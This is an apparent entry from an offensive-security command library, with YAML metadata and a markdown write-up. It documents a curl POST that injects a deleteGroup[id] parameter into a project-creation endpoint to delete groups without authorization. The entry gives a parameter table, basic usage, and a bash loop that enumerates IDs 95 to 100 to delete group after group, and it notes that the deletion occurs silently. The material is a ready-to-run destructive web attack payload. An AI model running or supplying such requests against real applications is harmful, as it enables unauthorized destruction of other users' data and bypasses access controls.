---
data: >-
  curl -X POST 'https://localize.example.com/pages/create_project/8h' -H
  'Content-Type: application/x-www-form-urlencoded' -H 'Cookie:
  session=your_session_cookie' -d 'CSRFToken=your_csrf_token&deleteGroup[id]=95'
tags:
  - web-testing
  - deletion
  - privilege-escalation
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:44.737Z'
id: 09ff1e50-8b2c-4b30-adf2-e9083dc89d6d
verified: false
validated: true
submitted: true
---
# curl-execute-group-deletion

## Command

```bash
curl -X POST 'https://localize.example.com/pages/create_project/8h' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: session=your_session_cookie' \
  -d 'CSRFToken=your_csrf_token&deleteGroup[id]=95'
```

## Description

This curl command executes unauthorized group deletion by injecting the deleteGroup[id] parameter into the abused endpoint.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| URL path | Endpoint with target project ID | Yes |
| `-H 'Content-Type: ...'` | Form data type | Yes |
| `-H 'Cookie: ...'` | User session | Yes |
| `-d 'CSRFToken=...'` | Anti-CSRF token | Yes |
| `-d 'deleteGroup[id]=...'` | Target group ID for deletion | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://localize.example.com/pages/create_project/8h' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: session=abc123' -d 'CSRFToken=token123&deleteGroup[id]=95'
```

### Advanced Usage

Loop for ID enumeration:

```bash
for id in {95..100}; do curl -s -X POST 'https://localize.example.com/pages/create_project/8h' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: session=abc123' -d "CSRFToken=token123&deleteGroup[id]=$id"; done
```

## Expected Output

HTTP 200 OK or redirect, with no explicit error; deletion occurs silently.

## Related

- [[commands/curl-modify-project-id]]
- [[procedures/Execute-Unauthorized-Group-Deletion]]
